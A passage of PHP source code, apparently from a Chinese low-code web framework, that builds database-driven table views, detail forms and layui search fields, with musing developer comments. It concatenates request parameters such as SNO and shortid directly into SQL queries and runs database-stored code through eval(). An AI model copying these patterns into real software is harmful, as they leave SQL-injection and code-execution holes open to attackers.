   //针对显示，小窗口与主窗口构成关系，联系，世间万物所有联系就是自己与父亲，自己与子孙的关系。三才，每个层级都有自己的三才。与他们的关系参数调整就是画面突变，每次可以自己调想要的样子，提问，下次显示的时候就提示你是不是自己要的样子，然后如果不是的话，可以选择突变回去的样子
   //要与不要，存在与不存在的抉择，新的理念把这个基因进化理念放入系统开发里。公布出去，仿基因系统调整，好多人以为自己懂人工智能也参与进来，注定要失败。试了多少自己的想法衡量与要合作的人，还停留在书本上，或者刚开始尝试，能坚持/不能坚持  坚持方向/对错（自己前提能否辨别（自己辨别的方法，承不承认自己不足）/是否愿意听别人的建议（偏听还是兼听）/ 听完（会不会给别人的意见找一些局部以偏概全的理由否定），这些都是违背马克思主义的，这种还是不会听，还是否习惯性固执己见）  对的哪个方向最捷径，是不是在这样的过程中进步寻找答案
   //总之造成自己决策失误的因素就是考虑方式没有科学的方法，考虑不全。  而且把错误和尊严做关联，错误不好意思承担起失去尊严的后果   
    $appid=_get("appid");
    $shortid=_get("shortid");
    $cfid=_get("cfid");
    $SNOx=_get("SNO");
    if ($SNOx!=""){      
    }else{
      $SNOx="0";
    };    
   if ($shortid!=""){//想办法把下面独立出来，如果有制定KEYS借用某SHORT页要可以实现，这样就能任意表查询了
     $_POST[$shortid."_stylex"]="";
     $_POST[$shortid."_scriptx"]="";
     $_POST[$shortid."_cssfiles"]="";
     $_POST[$shortid."_jsfiles"]="";   
     $cssmk=_get("cssmk");
    if ($cssmk!=""){
      $conn=mysql_connect(gl(),glu(),glp()); 
      $htmcss=htmlcss($cssmk,$htmcss);
      $csurd=$htmcss["csurd"];
      $chtml=$htmcss["chtml"];      
      $ncss=combinecss($shortid,$htmccs);     
    }else{
      $csurd="";
      $chtml="";
    }
     $sbase=shortinfo($shortid,$sbase);    
     //$ncss=combinecss($shortid,$sbase);  sbase里没有
     $scss=shortcss($shortid."DETAIL",$scss);
     $ncss=combinecss($shortid,$scss);          
     $pcss=pagecss($sbase["pageid"],$pcss);     
     $ncss=combinecss($shortid,$pcss);     
    if ($cfid!=""){
      $ccs=caseinfo($cfid,$ccs);
      $ncss=combinecss($shortid,$ccs);     
      if (strpos("xxx".$ccs["php"],"function")>0){
        eval($ccs["php"]);
      };
      //之后加上denycdt      
     $mkcdt=comcdt($pgnum,$page,$sbase["showkeys"],$sbase["cdt"],$sbase["orddt"],_get("allsearch"),$xk,$xv);     
     $gkinfo=thekeyfun($gkinfo,glb(),"SHORTID",$shortid);         
      //echo "pgnum-".$pgnum."xx".$page;
     $mkcdt=" SNO=".$SNOx;
     $conn=mysql_connect(gl(),glu(),glp()); 
     $sqlx= "";
      
     $sqlx="select ".$sbase["showkeys"]." from ".$sbase["tablename"]." where ".$mkcdt;      
      //echo $sqlx;
     $dtrst=selecteds($conn,glb(),$sqlx ,"utf8","");
     // echo $dtrst;
     $totrcd=countresult($dtrst);      
    if ($totrcd>0){      
     $arraydata=array();
     $arraydata=arrdata($arraydata,$dtrst);     
     $totx=$totrcd;
   // FUN:$funvalue="";       
    }else{
      $dtrst=str_replace(",","#-#",$sbase["showkeys"])."#/#";
      $arraydata=array();
      $arraydata=arrdata($arraydata,$dtrst);     
      $totx=1;      
    }//totrcd
     $arraydata=arrdefault($sbase["showkeys"],$gkinfo,$arraydata);
     $shoks=$sbase["showkeys"];
     $partk=explode(",",$shoks);
     $totptk=count($partk);               
     //之后加上denykey
     $binfo=array();
     $fmhtmlx="";
     $sbase["makecdt"]=$mkcdt;
     $fmktps="";      
    for ($p=0;$p<$totptk;$p++){
     $sshow=tostring($gkinfo[$partk[$p]]["COLUMN_SSHOW"]);
      $thusvalue="";
      if (strpos("zz".$sshow,"thusvalue")>0 ){
        eval(hou($sshow,"|"));
      };            
      $arraydata[$partk[$p]][0]=$thusvalue;
     $jjshow=tostring($gkinfo[$partk[$p]]["COLUMN_JSHOW"]);    
     if (strpos($jjshow,"{")>0 || strpos($jjshow,"=")>0  || strpos($jjshow,"\"")>0){
      $jjshow="dTYPE_HEX-".String2Hex($jjshow);
     };
      $jjpost=tostring($gkinfo[$partk[$p]]["COLUMN_JPOST"]);    
     if (strpos($jjpost,"{")>0 || strpos($jjpost,"=")>0  || strpos($jjpost,"\"")>0){
      $jjpost="dTYPE_HEX-".String2Hex($jjpost);
      };
     $fmktps=$fmktps."{\"keyname\":\"".$partk[$p]."\",\"datatype\":\"".$gkinfo[$partk[$p]]["COLUMN_TPNM"]."\",\"typelen\":\"".$gkinfo[$partk[$p]]["COLUMN_TPLEN"]."\",\"typetitle\":\"".$gkinfo[$partk[$p]]["COLUMN_TITLE"]."\",\"changeable\":\"".$gkinfo[$partk[$p]]["COLUMN_CANGE"]."\",\"clstxt\":\"".$gkinfo[$partk[$p]]["COLUMN_CLSTXT"]."\",\"jshow\":\"".$jjshow."\",\"jpost\":\"".$jjpost."\",\"classp\":\"".$gkinfo[$partk[$p]]["COLUMN_CLSSSP"]."\"},";
     if ($gkinfo[$partk[$p]]["COLUMN_CANGE"]=="0"){
      $fmcantc=$fmcantc.$partk[$p].",";
     };
   };
   if($totptk>0){
     $fmktps="[".substr($fmktps,0,strlen($fmktps)-1)."]";
   };
     $fmjs="{\"tbname\":\"".$sbase["tablename"]."\",\"cantkies\":\"".$fmcantc."\",\"asc\":\"".$allsc."\",\"xkey\":\"".$xk."\",\"xval\":\"".$xv."\",\"keys\":\"".$sbase["showkeys"]."\",\"pnum\":\"".$pgnum."\",\"page\":\"".$page."\",\"ktps\":".$fmktps.",\"totrcd\":\"".$totrcd."\",\"sqlstr\":\"".String2Hex("select ".$sbase["showkeys"]." from ".$sbase["tablename"]." where ".$mkcdt)."\",\"vls\":[";
    $fmch=""; 
    $alllei="";
      $tklei="";
    for ($ti=1;$ti<($totx+1);$ti++){      
      $fmtrinner="";
      $fmtrouter=$ccs["row"];
      $fmjs=$fmjs."{";      
      $demo=$chtml;
      $tk=0;
      $cdke="";      
      //var_dump($gkinfo);
     for ($tj=0;$tj<$totptk;$tj++){ 
         $fmjs=$fmjs."\"".$partk[$tj]."\":\"".str_replace("\"","\\"."\"",jstohex(tostring($arraydata[$partk[$tj]][$ti])))."\",";
         $tdxtp=$gkinfo[$partk[$tj]]["COLUMN_DXTYPE"];      
         if ($totrcd>0){
           $binfo=formtrow($binfo,$partk[$tj],$arraydata[$partk[$tj]][$ti],$arraydata["SNO"][$ti],$arraydata["OLMK"][$ti],$gkinfo,$sbase,$ti,$arraydata);                                                    
         }else{
           $binfo=formtrow($binfo,$partk[$tj],$thusvalue,"0",$arraydata["OLMK"][$ti],$gkinfo,$sbase,0,$arraydata);                                                    
         }
         ////////////////////////////////////////////////////////////////////////////////////       
         $comux=exchangeunit($binfo,$ccs[$tdxtp]);               
      if ($tj<($totptk*1-1)){
       $xy=intval($gkinfo[$partk[$tj+1]]["COLUMN_SQX"]);
       $tmplabel="";        
       if ($xy==(intval($gkinfo[$partk[$tj]]["COLUMN_SQX"])*1)){
         //发现后边有整数相等的 应在同一行
          if ($tk==0){
           //可以左侧弄了（最后弄左右，表述不对）， 累加开始
           //echo "可以左侧弄了（最后弄左右，表述不对）， 累加开始".$i."<br>--".$cdkx."---";
               if ($tmplabel==""){
                 $tmplabel=qian($ccs[$gkinfo[$partk[$tj]]["COLUMN_DXTYPE"]],"</label>")."</label>";
               };              
               $tklei=$tklei.$tmplabel.str_replace("{inline}",str_replace("class","style=\"margin-left:15px;width:90%\" ocls",hou($comux,"/label>")),$ccs["inline"]);          
               $exlei=$exlei."<label>".$gkinfo[$partk[$tj]]["COLUMN_EXPLAIN"]."</label>";
               $tmplabel="";
          }else{            
              //若已经在累加中了，所以此次左侧也不用弄，继续累加
               //echo "若已经在累加中了，所以此次左侧也不用弄，继续累加".$i."<br>--".$cdkx."---";
             if ($tmplabel==""){
               $tmplabel=qian($comux,"</label>")."</label>";
             };
             $pdx=round(($gkinfo[$partk[$tj]]["COLUMN_SQX"]*1-$gkinfo[$partk[$tj-1]]["COLUMN_SQX"]*1)*10);              
             if ($pdx*1==1){
               $tklei=$tklei.str_replace("{inline}",str_replace("class","ocls",hou($comux,"/label>")),$ccs["inline"]);                
             }else{          
                $tklei=$tklei.$tmplabel.str_replace("{inline}",str_replace("class","style=\"margin-left:30px;width:80%;\" ocls",hou($comux,"/label>")),$ccs["inline"]);                
                $exlei=$exlei."<label>".$gkinfo[$partk[$tj]]["COLUMN_EXPLAIN"]."</label>";
             }
             $tmplabel="";
          };//tk==0
       }else{//未发现与后面相等，如果tk>0只弄右侧
        if ($tk>0){
        // 只弄右侧 累计完加框，如果已经在累积中了，
       //echo "只弄右侧 累计完加框".$i."".$cdkx."<br>-----";
          if ($tmplabel==""){
           $tmplabel=qian($comux,"</label>")."</label>";
          };
           $pdx=round(($gkinfo[$partk[$tj]]["COLUMN_SQX"]*1-$gkinfo[$partk[$tj-1]]["COLUMN_SQX"]*1)*10);              
          if ($pdx*1==1){        
            $tklei=$tklei.str_replace("{inline}",str_replace("class","ocls",hou($comux,"/label>")),$ccs["inline"]);       
          }else{
           $tklei=$tklei.$tmplabel.str_replace("{inline}",str_replace("class","style=\"margin-left:30px;width:80%;\" ocls",hou($comux,"/label>")),$ccs["inline"]);                 
           $exlei=$exlei."<label>".$gkinfo[$partk[$tj]]["COLUMN_EXPLAIN"]."</label>";
          }
          $tmplabel="";          
          $rowx=str_replace("{rowx}",$tklei,$ccs["row"]);  
          $rowy=str_replace("{rowx}",$exlei,$ccs["row"]);  
        //套上本行累计者外套，准备结束
         $alllei=$alllei.$rowx;
         $allex=$allex.$rowy;
         $rowx="";      
       }else{ //右侧既没有等的，本次也不在累计中
        //左右逗弄  或支农这一个 直接加框
       //echo "左右都直接单独者套外套".$i."".$cdkx."<br>-----";
         $rowx=str_replace("{rowx}",$comux,$ccs["row"]);      
         $rowy=str_replace("{rowx}","<label>".$gkinfo[$partk[$tj]]["COLUMN_EXPLAIN"]."</label>",$ccs["row"]);      
         $alllei=$alllei.$rowx;          
         $allex=$allex.$rowy;
         $rowx="";
         $rowy="";
       }//tk         
      $tk=0;
      $tklei="";
      $exlei="";
    };  //if发现后边有相等的 
    if ($xy==(intval($gkinfo[$partk[$tj]]["COLUMN_SQX"]*1))){//发现后边有相等的
      $tk=$tk+1;
    }
  }else{//最后一个就这样给忽略了
         $rowx=str_replace("{rowx}",$comux,$ccs["row"]);      
         $rowy=str_replace("{rowx}","<label>".$gkinfo[$partk[$tj]]["COLUMN_EXPLAIN"]."</label>",$ccs["row"]);      
         $alllei=$alllei.$rowx;
         $allex=$allex.$rowy;
         $rowx="";
         $rowy="";
  };//if
      ////////////////////////////////////////////////////////////////////////////////////        
         $demo=str_replace("{SNO}",$arraydata['SNO'][$ti],$demo);
         $demo=str_replace("{key-SNO}",$arraydata['SNO'][$ti],$demo);
         $demo=str_replace("{thissno}",$arraydata['SNO'][$ti],$demo);
         $demo=str_replace("{".$partk[$tj]."}",$binfo["value"],$demo);
         $demo=str_replace("{key-".$partk[$tj]."}",tostring($arraydata[$partk[$tj]][$ti]),$demo);                            
         $fmtrinner=$fmtrinner.$comux;      
       };//有空加OPRT
        if ($totptk>0){
          $fmjs=substr($fmjs,0,strlen($fmjs)-1)."},";
          $fmch=$fmch.$demo;                    
        };      
    };//有必要的时候加上统计行 
     $onlyrow=$alllei;     
     $fmdft="{";
     for ($tj=0;$tj<$totptk;$tj++){ 
        $fmdft=$fmdft."\"".$partk[$tj]."\":\"".$arraydata[$partk[$tj]][0]."\",";         
     };//有空加OPRT
     if ($totrcd>0){
       $fmjs=substr($fmjs,0,strlen($fmjs)-1)."]}";
       $csurd=str_replace("{inner}",$fmch,$csurd);
     }else{
       $fmdft=substr($fmdft,0,strlen($fmdft)-1)."}";
       $fmjs=$fmjs.$fmdft."]}";
     };
      //makedetail之前先把htmcss里的各种diy转译
      $scss["diybutton"]=fmvalue($sbase["tablename"],"",$SNOx,"",tostring($scss["diybutton"]),$totrcd,$arraydata);
      $scss["diytop"]=fmvalue($sbase["tablename"],"",$SNOx,"",tostring($scss["diytop"]),$totrcd,$arraydata);
      $scss["diybottom"]=fmvalue($sbase["tablename"],"",$SNOx,"",tostring($scss["diybottom"]),$totrcd,$arraydata);
      $scss["diyshow"]=fmvalue($sbase["tablename"],"",$SNOx,"",tostring($scss["diyshow"]),$totrcd,$arraydata);
      $scss["bottombutton"]=fmvalue($sbase["tablename"],"",$SNOx,"",tostring($scss["bottombutton"]),$totrcd,$arraydata);
      $scss["expunit"]=fmvalue($sbase["tablename"],"",$SNOx,"",tostring($scss["expunit"]),$totrcd,$arraydata);
     $tablehtml=makedetail($ccs["srd"],$allex,$pghtml,$alllei,$sbase,$scss);
     $itab["stylex"]=$_POST[$shortid."_stylex"];
     $itab["scriptx"]=$_POST[$shortid."_scriptx"];
     $itab["cssfiles"]=$_POST[$shortid."_cssfiles"];
     $itab["jsfiles"]=$_POST[$shortid."_jsfiles"];
     $itab["title"]=$sbase["shorttitle"];
     $itab["tablename"]=$sbase["tablename"];
     $itab["showkeys"]=$sbase["showkeys"];
     $itab["allsearch"]=$allsc;
     $itab["xkey"]=$xk;
     $itab["xval"]=$xv;
     $itab["pagenum"]=$pgnum;
     $itab["page"]=$page;     
     $itab["sql"]=$sqlx;
     $itab["cdtstr"]=$cdtstr;
     $itab["html"]=$tablehtml;      
     $itab["rank"]=$onlyrow;
     $itab["json"]=$fmjs;
     $itab["demo"]=$csurd;
     $itab["units"]=$fmch;
     $itab["text"]=$dtrst;     
     return $itab;
    }else{//caseid
     return $itab;
    };
   }else{
     //shortid!=""  
     return $itab;
   };  
 }
 function anytab($itab=array()){
     //need shortid,pgnum,page,caseid,allsearch/presc,cssmk,denykey,denypmtarea,appid,dbinfo,   页面的cssmk也要吧，作为重要补充，  方法的美丽；要向数学函数一样简练 应存 已存 应展示 已展示 应（进/退），各种参数值模拟基因键位，结构有参，数据有参，展示位置，存储位置，基因肯定有更高层的控制机制，然后下面自动去实现，每一次选择都有这两项，让你自己选为了适应你的当次状况。类的使用是控制一叶拥有整片森林
   //针对显示，小窗口与主窗口构成关系，联系，世间万物所有联系就是自己与父亲，自己与子孙的关系。三才，每个层级都有自己的三才。与他们的关系参数调整就是画面突变，每次可以自己调想要的样子，提问，下次显示的时候就提示你是不是自己要的样子，然后如果不是的话，可以选择突变回去的样子
   //要与不要，存在与不存在的抉择，新的理念把这个基因进化理念放入系统开发里。公布出去，仿基因系统调整，好多人以为自己懂人工智能也参与进来，注定要失败。试了多少自己的想法衡量与要合作的人，还停留在书本上，或者刚开始尝试，能坚持/不能坚持  坚持方向/对错（自己前提能否辨别（自己辨别的方法，承不承认自己不足）/是否愿意听别人的建议（偏听还是兼听）/ 听完（会不会给别人的意见找一些局部以偏概全的理由否定），这些都是违背马克思主义的，这种还是不会听，还是否习惯性固执己见）  对的哪个方向最捷径，是不是在这样的过程中进步寻找答案
   //总之造成自己决策失误的因素就是考虑方式没有科学的方法，考虑不全。  而且把错误和尊严做关联，错误不好意思承担起失去尊严的后果   
    $appid=_get("appid");
    $shortid=_get("shortid");
    $pgnum=_get("pagenum");
    if ($pgnum!=""){
      $pgnum=$pgnum*1;
    };
    $cssmk=_get("cssmk");
    if ($cssmk!=""){
      $conn=mysql_connect(gl(),glu(),glp()); 
      $htmcss=htmlcss($cssmk,$htmcss);
      $csurd=$htmcss["csurd"];
      $chtml=$htmcss["chtml"];      
      $ncss=combinecss($shortid,$htmccs);     
    }else{
      $csurd="";
      $chtml="";
    }
    $page=_get("page");
    if ($page!=""){
      $page=$page*1;
    }
    $allsc=_get("allsearch"); 
    $xk=_get("xkey");
    $xv=_get("xval");
   if ($shortid!=""){//想办法把下面独立出来，如果有制定KEYS借用某SHORT页要可以实现，这样就能任意表查询了
     $_POST[$shortid."_stylex"]="";
     $_POST[$shortid."_scriptx"]="";
     $_POST[$shortid."_cssfiles"]="";
     $_POST[$shortid."_jsfiles"]="";     
     $sbase=shortinfo($shortid,$sbase);    
     $ncss=combinecss($shortid,$sbase);
     $scss=shortcss($shortid,$scss);
     $ncss=combinecss($shortid,$scss);          
     $pcss=pagecss($sbase["pageid"],$pcss);     
     $ncss=combinecss($shortid,$pcss);     
    if ($sbase["caseid"]!=""){
      $ccs=caseinfo($sbase["caseid"],$ccs);
      if (strpos("xxx".$ccs["php"],"function")>0){
        eval($ccs["php"]);
      };
      $ncss=combinecss($shortid,$ccs);     
      //之后加上denycdt      
     $mkcdt=comcdt($pgnum,$page,$sbase["showkeys"],$sbase["cdt"],$sbase["orddt"],_get("allsearch"),$xk,$xv);     
     $gkinfo=thekeyfun($gkinfo,glb(),$sbase["tablename"],$sbase["showkeys"]);    
     if ($allsc.$xk.$xv==""){
       $alltot=UX("select count(*) as result from ".$sbase["tablename"])*1;
       $cdtstr="";
     }else{
       if (strpos($mkcdt,"limit ")>0){
         $nolmt=qian($mkcdt," limit ");
         $alltot=UX("select count(*) as result from ".$sbase["tablename"]." where ".$nolmt)*1;
         $cdtstr=$nolmt;
       }else{
         $alltot=UX("select count(*) as result from ".$sbase["tablename"]." where ".$mkcdt)*1;
         $cdtstr=$mkcdt;
       }
     }
      //echo "pgnum-".$pgnum."xx".$page;
     $pghtml=makepagerow($pgnum,$page,$alltot,$shortid,$ccs,$allsc,$xk,$xv);
     $conn=mysql_connect(gl(),glu(),glp()); 
     $sqlx= "";
      if (str_replace(" ","",$allsc.$xk.$xv)!=""){//limit 条件
        $sqlx="select ".$sbase["showkeys"]." from ".$sbase["tablename"]." where ".$mkcdt;        
      }else{
        $sqlx="select ".$sbase["showkeys"]." from ".$sbase["tablename"]." ".$mkcdt;        
      }   
      
      $dtrst=selecteds($conn,glb(),$sqlx ,"utf8","");
      //echo "select ".$sbase["showkeys"]." from ".$sbase["tablename"];
     $totrcd=countresult($dtrst);
    if ($totrcd>0){
      $arraydata=array();
      $arraydata=arrdata($arraydata,$dtrst);     
      $arraydata=arrdefault($sbase["showkeys"],$gkinfo,$arraydata);
   // FUN:$funvalue="";      
     $shoks=$sbase["showkeys"];
     $partk=explode(",",$shoks);
     $totptk=count($partk);         
     $tablehd=maketbhead($shoks,$gkinfo,$ccs,$sbase);      
     //之后加上denykey
     $binfo=array();
     $fmhtmlx="";
     $sbase["makecdt"]=$mkcdt;
     $sbase["pnum"]=$pgnum;
     $sbase["page"]=$page;     
     $sbase["asc"]=$allsc;    
     $sbase["xkey"]=$xk;    
     $sbase["xval"]=$xv;    
     $fmktps="";      
    for ($p=0;$p<$totptk;$p++){
     $jjshow=$gkinfo[$partk[$p]]["COLUMN_JSHOW"];
     $jjpost=$gkinfo[$partk[$p]]["COLUMN_JPOST"];    
     if (strpos($jjshow,"{")>0 || strpos($jjshow,"=")>0  || strpos($jjshow,"\"")>0){
      $jjshow="dTYPE_HEX-".String2Hex($jjshow);
     };
     if (strpos($jjpost,"{")>0 || strpos($jjpost,"=")>0  || strpos($jjpost,"\"")>0){
      $jjpost="dTYPE_HEX-".String2Hex($jjpost);
      };
     $fmktps=$fmktps."{\"keyname\":\"".$partk[$p]."\",\"datatype\":\"".$gkinfo[$partk[$p]]["COLUMN_TPNM"]."\",\"typelen\":\"".$gkinfo[$partk[$p]]["COLUMN_TPLEN"]."\",\"typetitle\":\"".$gkinfo[$partk[$p]]["COLUMN_TITLE"]."\",\"changeable\":\"".$gkinfo[$partk[$p]]["COLUMN_CANGE"]."\",\"clstxt\":\"".$gkinfo[$partk[$p]]["COLUMN_CLSTXT"]."\",\"jshow\":\"".$jjshow."\",\"jpost\":\"".$jjpost."\",\"classp\":\"".$gkinfo[$partk[$p]]["COLUMN_CLSSSP"]."\"},";
     if ($gkinfo[$partk[$p]]["COLUMN_CANGE"]=="0"){
      $fmcantc=$fmcantc.$partk[$p].",";
     };
   };
   if($totptk>0){
     $fmktps="[".substr($fmktps,0,strlen($fmktps)-1)."]";
   };
     $fmjs="{\"tbname\":\"".$sbase["tablename"]."\",\"cantkies\":\"".$fmcantc."\",\"asc\":\"".$allsc."\",\"xkey\":\"".$xk."\",\"xval\":\"".$xv."\",\"keys\":\"".$sbase["showkeys"]."\",\"pnum\":\"".$pgnum."\",\"page\":\"".$page."\",\"ktps\":".$fmktps.",\"totrcd\":\"".$totrcd."\",\"sqlstr\":\"".String2Hex("select ".$sbase["showkeys"]." from ".$sbase["tablename"]." where ".$mkcdt)."\",\"vls\":[";
    $fmch="";         
    for ($ti=1;$ti<($totrcd+1);$ti++){      
      $fmtrinner="";
      $fmtrouter=$ccs["row"];
      $fmjs=$fmjs."{";      
      $demo=$chtml;
       for ($tj=0;$tj<$totptk;$tj++){ 
         $fmjs=$fmjs."\"".$partk[$tj]."\":\"".str_replace("\"","\\"."\"",jstohex(tostring($arraydata[$partk[$tj]][$ti])))."\",";
         $tdxtp=$gkinfo[$partk[$tj]]["COLUMN_DXTYPE"];         
         $binfo=formtrow($binfo,$partk[$tj],$arraydata[$partk[$tj]][$ti],$arraydata["SNO"][$ti],$arraydata["OLMK"][$ti],$gkinfo,$sbase,$ti,$arraydata);
         $comux=exchangeunit($binfo,$ccs[$tdxtp]);         
         $demo=str_replace("{SNO}",$arraydata['SNO'][$ti],$demo);
         $demo=str_replace("{key-SNO}",$arraydata['SNO'][$ti],$demo);
         $demo=str_replace("{thissno}",$arraydata['SNO'][$ti],$demo);
         $demo=str_replace("{".$partk[$tj]."}",$binfo["value"],$demo);
         $demo=str_replace("{key-".$partk[$tj]."}",tostring($arraydata[$partk[$tj]][$ti]),$demo);
         $fmtrinner=$fmtrinner.$comux;                  
       };//有空加OPRT
        if ($totptk>0){
          $fmjs=substr($fmjs,0,strlen($fmjs)-1)."},";
          $fmch=$fmch.$demo;          
          $fmhtmlx=$fmhtmlx.str_replace("{rowx}",$fmtrinner,$fmtrouter);
        };      
    };//有必要的时候加上统计行 
     $onlyrow=$fmhtmlx;
      if ($sbase["ctraw"]==1){
       $fmtrinner="";
       $fmtrouter=$ccs["row"];
       for ($tj=0;$tj<$totptk;$tj++){              
         $tdxtp="decimal";         
         $binfo=formtrow($binfo,$partk[$tj],$arraydata[$partk[$tj]][$totrcd+2],$arraydata["SNO"][$totrcd+2],$arraydata["OLMK"][$totrcd+2],$gkinfo,$sbase,$totrcd+2,$arraydata);
         $comux=exchangeunit($binfo,$ccs[$tdxtp]);
         $demo=str_replace("{SNO}","本页合计",$demo);
         $demo=str_replace("{key-SNO}","本页合计",$demo);
         $demo=str_replace("{thissno}","本页合计",$demo);
         $demo=str_replace("{".$partk[$tj]."}",tostring($arraydata[$partk[$tj]][$totrcd+2]),$demo);
         $demo=str_replace("{key-".$partk[$tj]."}",tostring($arraydata[$partk[$tj]][$totrcd+2]),$demo);
         $fmtrinner=$fmtrinner.$comux;                  
        };//
       $fmhtmlx=$fmhtmlx.str_replace("{rowx}",$fmtrinner,$fmtrouter);
      };//ctraw   
      $fmdft="{";
     for ($tj=0;$tj<$totptk;$tj++){ 
        $fmdft=$fmdft."\"".$partk[$tj]."\":\"".$arraydata[$partk[$tj]][0]."\",";         
     };//有空加OPRT
     if ($totrcd>0){
       $fmjs=substr($fmjs,0,strlen($fmjs)-1)."]}";     
       $csurd=str_replace("{inner}",$fmch,$csurd);
     }else{
       $fmdft=substr($fmdft,0,strlen($fmdft)-1)."}";
       $fmjs=$fmjs.$fmdft."]}";     
     };
      //maketable前把SBASE里的各种DIY 解析了
      
     $sbase["diycode"]=fmvalue($sbase["tablename"],"","0","",tostring(anyvalue($strst,"diycode",0)),0,$arraydata);
     $sbase["headx"]=fmvalue($sbase["tablename"],"","0","",tostring(anyvalue($strst,"headx",0)),0,$arraydata);
     $sbase["diytop"]=fmvalue($sbase["tablename"],"","0","",tostring(anyvalue($strst,"diytop",0)),0,$arraydata);
     $sbase["diybottom"]=fmvalue($sbase["tablename"],"","0","",tostring(anyvalue($strst,"diybottom",0)),0,$arraydata);
  
     $tablehtml=maketable($ccs["srd"],$tablehd,$pghtml,$fmhtmlx,$sbase);
     $itab["stylex"]=$_POST[$shortid."_stylex"];
     $itab["scriptx"]=$_POST[$shortid."_scriptx"];
     $itab["cssfiles"]=$_POST[$shortid."_cssfiles"];
     $itab["jsfiles"]=$_POST[$shortid."_jsfiles"]; 
     $itab["title"]=$sbase["shorttitle"];           
     $itab["tablename"]=$sbase["tablename"];
     $itab["showkeys"]=$sbase["showkeys"];
     $itab["allsearch"]=$allsc;
     $itab["xkey"]=$xk;
     $itab["xval"]=$xv;
     $itab["pagenum"]=$pgnum;
     $itab["page"]=$page;     
     $itab["sql"]=$sqlx;
     $itab["cdtstr"]=$cdtstr;
     $itab["html"]=$tablehtml;      
     $itab["rank"]=$onlyrow;
     $itab["json"]=$fmjs;
     $itab["demo"]=$csurd;
     $itab["units"]=$fmch;
     $itab["text"]=$dtrst;
     }else{      
     };//totrcd>0
     return $itab;
    }else{//caseid
     return $itab;
    };
   }else{
     //shortid!=""  
     return $itab;
   };  
 }
function setkeysearch($shortid){
 $tmfx='<script>
   $(function() {
    layui.use(\'laydate\', function() {
     var laydate = layui.laydate;   
     //执行一个laydate实例
     laydate.render({
      elem: \'#qa_[keyid][N]\' //指定元素
     });
     laydate.render({
      elem: \'#qb_[keyid][N]\' //指定元素
     });
    });
   })
</script>';
$allkeyx=SX("select COLUMN_NAME,DATA_TYPE,keytitle,VQX,clstxt,dxtype from coode_keydetaily where shortid='".$shortid."' and VQX>0");
$fmlix="";
$fmkix="";
$tot=countresult($allkeyx);
$prevqx=anyvalue($allkeyx,"VQX",0);
for ($i=0;$i<$tot;$i++){
  $fmkix=$fmkix.anyvalue($allkeyx,"COLUMN_NAME",$i).":".anyvalue($allkeyx,"DATA_TYPE",$i)."/";
              if (anyvalue($allkeyx,"clstxt",$i)!=""){
                $newonex=anyvalue($allkeyx,"clstxt",$i);
                if (strpos($newonex,"key-")>0){
                   $hk=qian(hou($newonex,"key-"),"]");
                   $newonex="";
                 }else{
                    $newonex=str_replace("[","",$newonex);
                    $newonex=str_replace("]","",$newonex);
                    $newonex=str_replace("{","",$newonex);
                    $newonex=str_replace("}","",$newonex);
                   if (strpos("--".$newonex,"key")>0 ){
                      if (strpos($newonex,",")>0){
                       $ptnewo=explode(",",$newonex);
                       $totpn=count($ptnewo);
                       $fmmaq="";
                       $fmmah="";
                       for($zm=0;$zm<$totpn-1;$zm++){
                         $bknw=anyshort($ptnewo[$zm],"","");
                         $fmmaq=$fmmaq.qian($bknw,"|").",";
                         $fmmah=$fmmah.hou($bknw,"|").",";
                       }
                       $bknw=anyshort($ptnewo[$totpn-1],"","");
                       $fmmaq=$fmmaq.qian($bknw,"|");
                       $fmmah=$fmmah.hou($bknw,"|");
                       $newonex=$fmmaq."|".$fmmah;
                     }else{//发现有多个取值
                       $newonex=anyshort($newonex,"","");
                     }                    
                   };
                 };
                };
  switch (anyvalue($allkeyx,"DATA_TYPE",$i)){
    case "tinyint":    
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
        if (anyvalue($allkeyx,"clstxt",$i)!=""){
         $tmpkx="<label class=\"layui-form-label\" >".cut_str(anyvalue($allkeyx,"keytitle",$i),3)."</label><div class=\"layui-input-inline\" >".formselect(qian($newonex,"|"),hou($newonex,"|"),"","q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]","layui-select","")."</div>";
        }else{
         $tmpkx="<label class=\"layui-form-label\" >".cut_str(anyvalue($allkeyx,"keytitle",$i),3)."</label><div class=\"layui-input-inline\" ><input class=\"layui-input\" id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\"></div>";
        }
      }else{
       if (anyvalue($allkeyx,"clstxt",$i)!=""){
        $tmpkx="<label class=\"layui-form-label\" >".anyvalue($allkeyx,"COLUMN_NAME",$i)."</label><div class=\"layui-input-inline\" >".formselect(qian($newonex,"|"),hou($newonex,"|"),"","q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]","layui-select","")."</div>";
       }else{
        $tmpkx="<label class=\"layui-form-label\" >".anyvalue($allkeyx,"COLUMN_NAME",$i)."</label><div class=\"layui-input-inline\" ><input class=\"layui-input\" id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\"></div>";
       }
      };
    break;
    case "int":           
      if (anyvalue($allkeyx,"keytitle",$i)!=""){
        if (anyvalue($allkeyx,"clstxt",$i)!=""){
         $tmpkx="<label class=\"layui-form-label\" >".cut_str(anyvalue($allkeyx,"keytitle",$i),3)."</label><div class=\"layui-input-inline\" >".formselect(qian($newonex,"|"),hou($newonex,"|"),"","q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]","layui-select","")."</div>";
        }else{
         $tmpkx="<label class=\"layui-form-label\" >".cut_str(anyvalue($allkeyx,"keytitle",$i),3)."</label><div class=\"layui-input-inline\" ><input class=\"layui-input\" id=\"qa_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\">--<input id=\"qb_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]\" size=\"8\"></div>";
        };
      }else{
        if (anyvalue($allkeyx,"clstxt",$i)!=""){
         $tmpkx="<label class=\"layui-form-label\" >".anyvalue($allkeyx,"COLUMN_NAME",$i)."</label><div class=\"layui-input-inline\" >".formselect(qian($newonex,"|"),hou($newonex,"|"),"","q_".anyvalue($allkeyx,"COLUMN_NAME",$i)."[N]","layui-select","")."</div>";
        }else{
